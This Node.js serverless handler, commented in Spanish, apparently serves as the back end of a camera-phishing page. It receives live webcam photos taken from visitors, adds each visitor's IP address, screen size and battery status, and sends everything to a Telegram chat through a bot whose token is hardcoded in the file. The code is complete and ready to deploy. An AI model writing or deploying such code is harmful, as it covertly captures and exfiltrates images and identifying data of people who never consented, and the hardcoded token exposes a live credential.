// Función para enviar foto a Telegram usando base64
async function sendPhotoToTelegram(photoBase64, caption, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM';
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('ERROR: Telegram no configurado');
    return false;
  }

  try {
    // Convertir base64 a buffer
    const photoBuffer = Buffer.from(photoBase64, 'base64');
    
    // Crear multipart/form-data manualmente para la foto
    const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
    const photoFileName = `photo_${Date.now()}_${ip.replace(/[:.]/g, '-')}.jpg`;
    
    // Construir el cuerpo multipart
    let body = '';
    
    // Chat ID
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    
    // Caption
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
    body += `${caption}\r\n`;
    
    // Photo file
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="photo"; filename="${photoFileName}"\r\n`;
    body += `Content-Type: image/jpeg\r\n\r\n`;
    
    // Crear el buffer final
    const preBuffer = Buffer.from(body, 'utf8');
    const postBuffer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
    const finalBuffer = Buffer.concat([preBuffer, photoBuffer, postBuffer]);
    
    console.log(`📤 Enviando foto a Telegram (${(photoBuffer.length / 1024).toFixed(2)}KB)...`);
    
    const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': finalBuffer.length.toString()
      },
      body: finalBuffer
    });

    const photoResult = await photoResponse.json();

    if (photoResponse.ok) {
      console.log('✅ Foto enviada a Telegram exitosamente');
      return true;
    } else {
      console.log('❌ Error enviando foto:', photoResult);
      return false;
    }
  } catch (error) {
    console.error('❌ Error crítico enviando foto:', error);
    return false;
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection?.remoteAddress ||
               'unknown';
               
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Parsear JSON body
    const { photoBase64, photoCount, deviceInfo, timestamp: clientTimestamp } = req.body;
    
    if (!photoBase64) {
      return res.status(400).json({ status: 'error', message: 'No photo data received' });
    }

    // Calcular tamaño estimado
    const estimatedSize = (photoBase64.length * 3) / 4; // Estimación del tamaño decodificado
    const fileSizeKB = (estimatedSize / 1024).toFixed(2);

    // Crear caption para la foto
    let caption = `📸 FOTO EN VIVO #${photoCount || '?'}

📍 <b>IP:</b> <code>${ip}</code>
⏰ <b>Hora:</b> ${timestamp}
📊 <b>Tamaño:</b> ${fileSizeKB}KB
🎥 <b>Estado:</b> Cámara activa`;

    // Añadir info del dispositivo si está disponible
    if (deviceInfo && Object.keys(deviceInfo).length > 0) {
      if (deviceInfo.screenWidth) {
        caption += `\n📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`;
      }
      if (deviceInfo.battery && deviceInfo.battery !== 'No disponible') {
        const batteryInfo = typeof deviceInfo.battery === 'object' 
          ? `${deviceInfo.battery.level} (${deviceInfo.battery.charging ? 'cargando' : 'desconectado'})`
          : deviceInfo.battery;
        caption += `\n🔋 <b>Batería:</b> ${batteryInfo}`;
      }
    }

    // Enviar a Telegram
    const telegramSent = await sendPhotoToTelegram(photoBase64, caption, ip);

    // Log
    console.log(`[${timestamp}] PHOTO_SENT #${photoCount} from ${ip} - Size: ${fileSizeKB}KB - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);

    res.json({ 
      status: 'success', 
      message: telegramSent ? 'Foto enviada a Telegram' : 'Error enviando foto',
      telegramSent: telegramSent,
      photoCount: photoCount,
      timestamp: timestamp,
      size: `${fileSizeKB}KB`
    });

  } catch (error) {
    console.error('Error processing photo:', error);
    res.status(500).json({ status: 'error', message: 'Error processing photo' });
  }
}; 